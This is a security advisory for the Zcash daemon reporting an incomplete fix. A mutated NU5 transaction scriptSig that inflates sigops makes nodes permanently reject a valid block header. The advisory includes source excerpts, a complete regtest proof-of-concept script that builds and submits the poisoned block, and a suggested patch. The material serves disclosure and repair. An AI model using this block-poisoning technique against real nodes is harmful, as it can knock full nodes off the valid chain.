# [M] Incomplete fix for GHSA-rpcw-q5mr-gq35: NU5 block body poisoning via bad-blk-sigops

## Summary
Severity: Medium
Chain: Zcash
Component: zcash/zcash
Published: 2026-07-13
Source: https://github.com/zcash/zcash/security/advisories/GHSA-qvwc-hc2r-82qv
Type: github-advisory

## Details
### Summary

The fix for GHSA-rpcw-q5mr-gq35 appears incomplete. A NU5 block body/header mismatch can still permanently poison a valid block header through the `bad-blk-sigops` rejection path.

A remote unauthenticated peer can mutate authorizing data in a NU5 v5 transaction `scriptSig` so that the block keeps the same txid Merkle root and header hash, but exceeds `MAX_BLOCK_SIGOPS`. The mutated body is rejected by `CheckBlock()` as `bad-blk-sigops` before the NU5 auth-data/block-commitment mismatch check runs. Because this rejection does not set `corruptionIn=true`, `AcceptBlock()` marks the shared block header as `BLOCK_FAILED_VALID`. The genuine block body for the same header is then rejected as `duplicate-invalid`.

This is a surviving trigger path for the same class of block-body poisoning that GHSA-rpcw-q5mr-gq35 intended to prevent.

### Details

Tested against:

```text
Zcash Daemon version v6.12.3-db3082b0b
commit db3082b0bed7005c1688b901b85e417635ef3adf
```

The problematic rejection is in `CheckBlock()`:

```cpp
// src/main.cpp
if (nSigOps > MAX_BLOCK_SIGOPS)
    return state.DoS(100, error("CheckBlock(): out-of-bounds SigOpCount"),
                     REJECT_INVALID, "bad-blk-sigops");
```

`CValidationState::DoS()` defaults `corruptionIn` to false:

```cpp
// src/consensus/validation.h
virtual bool DoS(
    int level,
    bool ret = false,
    unsigned int chRejectCodeIn = 0,
    const std::string& strRejectReasonIn = "",
    bool corruptionIn = false,
    const std::string& strDebugMessageIn = "")
```

Then `AcceptBlock()` permanently marks the block index failed when the state is invalid and not corruption-possible:

```cpp
// src/main.cpp
if (state.IsInvalid() && !state.CorruptionPossible()) {
    pindex->nStatus |= BLOCK_FAILED_VALID;
    setDirtyBlockIndex.insert(pindex);
}
```

Later receipt of the same header is rejected if the block index is marked failed:

```cpp
// src/main.cpp
if (pindex->nStatus & BLOCK_FAILED_MASK)
    return state.Invalid(error("%s: block is marked invalid", __func__), 0, "duplicate");
```

The GHSA fix added `CheckBlockBodyAuthCommitment()`, but in the active-tip `AcceptBlock()` path it currently runs after `CheckBlock()`:

```cpp
// src/main.cpp
if ((!CheckBlock(block, state, chainparams, verifier, true, true, fCheckTransactions)) ||
     !ContextualCheckBlock(block, state, chainparams, pindex->pprev, fCheckTransactions)) {
    if (state.IsInvalid() && !state.CorruptionPossible()) {
        pindex->nStatus |= BLOCK_FAILED_VALID;
        setDirtyBlockIndex.insert(pindex);
    }
    return false;
}

if (pindex->pprev != nullptr && pindex->pprev == chainActive.Tip()) {
    std::optional<uint256> hashAuthDataRoot_, hashChainHistoryRoot_;
    if (!CheckBlockBodyAuthCommitment(block, nHeight, *pcoinsTip, chainparams.GetConsensus(),
                                      state, hashAuthDataRoot_, hashChainHistoryRoot_)) {
        return false;
    }
}
```

So a mutated NU5 body can hit `bad-blk-sigops` before the auth commitment mismatch is classified.

This is possible because legacy sigops include `scriptSig`:

```cpp
// src/main.cpp
unsigned int GetLegacySigOpCount(const CTransaction& tx)
{
    unsigned int nSigOps = 0;
    for (const CTxIn& txin : tx.vin)
    {
        nSigOps += txin.scriptSig.GetSigOpCount(false);
    }
    ...
}
```

but the block Merkle root is built from transaction hashes:

```cpp
// src/consensus/merkle.cpp
uint256 BlockMerkleRoot(const CBlock& block, bool* mutated)
{
    std::vector<uint256> leaves;
    leaves.resize(block.vtx.size());
    for (size_t s = 0; s < block.vtx.size(); s++) {
        leaves[s] = block.vtx[s].GetHash();
    }
    return ComputeMerkleRoot(std::move(leaves), mutated);
}
```

For NU5 v5 transactions, authorizing data such as transparent `scriptSig` affects the auth digest rather than the txid. The block auth-data Merkle tree is built separately from auth digests:

```cpp
// src/primitives/block.cpp
for (auto &tx : vtx) {
    tree.push_back(tx.GetAuthDigest());
}
```

Therefore, mutating a v5 transaction's `scriptSig` can preserve:

```text
same txid: true
same txid Merkle root: true
same block header hash: true
```

while changing:

```text
auth digest: changed
auth-data root: changed
hashBlockCommitments match: false
legacy sigops: > MAX_BLOCK_SIGOPS
```

The block body is inconsistent with the header and should be treated as body/header corruption, not as a permanent invalidity of the shared header.

### PoC

This is a regtest functional test. It does not require mainnet funds or external peers. The RPC interface is only used to deterministically drive the real `zcashd` consensus validation path.

Reproduction steps:

```bash
git clone https://github.com/zcash/zcash.git
cd zcash
git checkout db3082b0bed7005c1688b901b85e417635ef3adf
./zcutil/build.sh -j"$(nproc)"
```

Add the following file:

```text
qa/rpc-tests/nu5_bad_blk_sigops_body_poisoning.py
```

```python
#!/usr/bin/env python3

import copy
import sys
import types
from io import BytesIO

# Python 3.12 removed asyncore. The test framework imports it for P2P helpers,
# but this test only uses RPC and block/transaction serialization structures.
asyncore_stub = types.ModuleType("asyncore")


class DummyDispatcher:
    def __init__(self, *args, **kwargs):
        pass


asyncore_stub.dispatcher = DummyDispatcher
asyncore_stub.loop = lambda *args, **kwargs: None
sys.modules.setdefault("asyncore", asyncore_stub)

from test_framework.blocktools import create_block
from test_framework.mininode import CTransaction
from test_framework.script import CScript, OP_CHECKSIG
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import (
    BLOSSOM_BRANCH_ID,
    CANOPY_BRANCH_ID,
    HEARTWOOD_BRANCH_ID,
    NU5_BRANCH_ID,
    assert_equal,
    hex_str_to_bytes,
    nuparams,
    nustr,
    start_nodes,
)


MAX_BLOCK_SIGOPS = 20000


class Nu5BadBlkSigopsBodyPoisoningTest(BitcoinTestFramework):
    def __init__(self):
        super().__init__()
        self.num_nodes = 1
        self.cache_behavior = "clean"

    def setup_network(self, split=False):
        args = [
            nuparams(BLOSSOM_BRANCH_ID, 1),
            nuparams(HEARTWOOD_BRANCH_ID, 1),
            nuparams(CANOPY_BRANCH_ID, 1),
            nuparams(NU5_BRANCH_ID, 1),
            "-allowdeprecated=getnewaddress",
        ]
        self.nodes = start_nodes(self.num_nodes, self.options.tmpdir, [args] * self.num_nodes)
        self.is_network_split = False
        self.node = self.nodes[0]

    def build_block_from_template(self):
        node = self.node
        gbt = node.getblocktemplate()

        coinbase = CTransaction()
        coinbase.deserialize(BytesIO(hex_str_to_bytes(gbt["coinbasetxn"]["data"])))
        coinbase.calc_sha256()

        block = create_block(
            int(gbt["previousblockhash"], 16),
            coinbase,
            gbt["mintime"],
            int(gbt["bits"], 16),
            int(gbt["defaultroots"]["blockcommitmentshash"], 16),
        )

        for gbt_tx in gbt["transactions"]:
            tx = CTransaction()
            tx.deserialize(BytesIO(hex_str_to_bytes(gbt_tx["data"])))
            tx.calc_sha256()
            assert_equal(tx.hash, gbt_tx["hash"])
            block.vtx.append(tx)

        assert_equal(len(block.vtx), 2)
        block.hashMerkleRoot = int(gbt["defaultroots"]["merkleroot"], 16)
        block.hashAuthDataRoot = int(gbt["defaultroots"]["authdataroot"], 16)
        block.solve()
        block.calc_sha256()
        return block

    def run_test(self):
        node = self.node

        node.generate(101)
        assert_equal(
            node.getblockchaininfo()["upgrades"][nustr(NU5_BRANCH_ID)]["status"],
            "active")

        txid = node.sendmany("", {node.getnewaddress(): 0.1})
        assert_equal(node.getrawmempool(), [txid])

        block_good = self.build_block_from_template()
        block_bad = copy.deepcopy(block_good)

        tx_bad = block_bad.vtx[1]
        tx_bad.vin[0].scriptSig = CScript([OP_CHECKSIG] * (MAX_BLOCK_SIGOPS + 1))
        tx_bad.rehash()

        # Keep the original block header hash.
        block_bad.rehash_without_recalc()

        assert block_bad.serialize() != block_good.serialize()
        assert_equal(block_bad.hash, block_good.hash)
        assert_equal(block_bad.vtx[1].hash, block_good.vtx[1].hash)
        assert_equal(block_bad.hashMerkleRoot, block_good.hashMerkleRoot)
        assert block_bad.vtx[1].auth_digest != block_good.vtx[1].auth_digest
        assert block_bad.calc_auth_data_root() != block_good.hashAuthDataRoot

        height_before = node.getblockcount()
        best_before = node.getbestblockhash()

        assert_equal(node.submitblock(block_bad.serialize().hex()), "bad-blk-sigops")
        assert_equal(node.getblockcount(), height_before)
        assert_equal(node.getbestblockhash(), best_before)

        # This demonstrates the surviving poison: the canonical body for the
        # same header cannot replace the bad body/header failure because the
        # header was cached as BLOCK_FAILED_VALID.
        assert_equal(node.submitblock(block_good.serialize().hex()), "duplicate-invalid")
        assert_equal(node.getblockcount(), height_before)
        assert_equal(node.getbestblockhash(), best_before)


if __name__ == "__main__":
    Nu5BadBlkSigopsBodyPoisoningTest().main()
```

Run:

```bash
chmod +x qa/rpc-tests/nu5_bad_blk_sigops_body_poisoning.py
qa/rpc-tests/nu5_bad_blk_sigops_body_poisoning.py --srcdir=./src --tmpdir=/tmp/zcash_bad_sigops_poc
```

Expected vulnerable result:

```text
Initializing test directory /tmp/zcash_bad_sigops_poc/...
Stopping nodes
Cleaning up
Tests successful
```

The important assertions are:

```text
submitblock(poisoned_block) == "bad-blk-sigops"
submitblock(genuine_block)  == "duplicate-invalid"
```

The second result demonstrates that the valid block body cannot be accepted after the poisoned body has marked the shared header invalid.

### Impact

This is a consensus availability vulnerability.

An unauthenticated P2P attacker who can deliver a poisoned block body before the genuine body can cause an affected node to permanently reject an otherwise valid block header. The affected node may stop following the valid chain until manual recovery, such as reconsideration or reindexing.

Impacted parties are Zcash full nodes running the affected validation code on NU5-active networks. The real attack path is standard P2P block processing; the PoC uses regtest/RPC only to make reproduction deterministic.

The attacker model is a remote peer on the Zcash P2P network. The attacker does not need RPC credentials, local access, wallet access, mining capability, or operator misconfiguration. The main practical constraints are block propagation timing and the availability of a suitable NU5 block body with enough size headroom for the sigop-inflating mutation.

### Suggested Fix

The narrow fix is to restore `corruptionIn=true` for `bad-blk-sigops`:

```diff
diff --git a/src/main.cpp b/src/main.cpp
@@
     if (nSigOps > MAX_BLOCK_SIGOPS)
         return state.DoS(100, error("CheckBlock(): out-of-bounds SigOpCount"),
-                         REJECT_INVALID, "bad-blk-sigops");
+                         REJECT_INVALID, "bad-blk-sigops", true);
```

A broader fix would be to ensure NU5 block body auth commitment validation runs before any body-mutable authorizing-data-derived rejection can mark `BLOCK_FAILED_VALID`, and to audit other `CheckBlock()` rejection paths that can be triggered by fields excluded from the txid/header commitment but included in NU5 auth data.
